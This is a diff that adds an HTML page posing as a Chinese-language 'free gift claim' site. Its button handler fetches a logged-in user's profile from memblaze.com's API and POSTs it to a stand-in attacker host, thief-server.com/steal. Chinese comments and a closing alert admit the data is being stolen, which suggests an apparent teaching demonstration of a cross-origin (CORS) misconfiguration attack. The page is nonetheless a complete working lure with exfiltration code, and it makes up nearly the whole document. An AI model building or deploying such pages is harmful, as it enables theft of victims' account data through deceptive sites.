@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>免费礼品领取</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .gift { background: #f0f0f0; padding: 20px; margin: 10px; border-radius: 5px; }
+        button { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>🎁 免费礼品领取中心</h1>
+    <div class="gift">
+        <h2>点击领取神秘礼品！</h2>
+        <button onclick="claimGift()">立即领取</button>
+    </div>
+    
+    <script>
+        function claimGift() {
+            // 这里是关键：通过没关好的窗户往银行里看
+            fetch('https://memblaze.com/api/user/profile')
+                .then(response => response.json())
+                .then(data => {
+                    // 窃取到的数据
+                    console.log('窃取到的用户信息：', data);
+                    
+                    // 将数据发送到小偷的服务器
+                    fetch('https://thief-server.com/steal', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            stolenData: data,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    
+                    alert('礼品领取成功！（但实际上你的信息已经被偷了）');
+                })
+                .catch(error => {
+                    console.error('偷取失败：', error);
+                    alert('礼品领取失败，请重试');
+                });
+        }
+    </script>
+</body>
+</html>
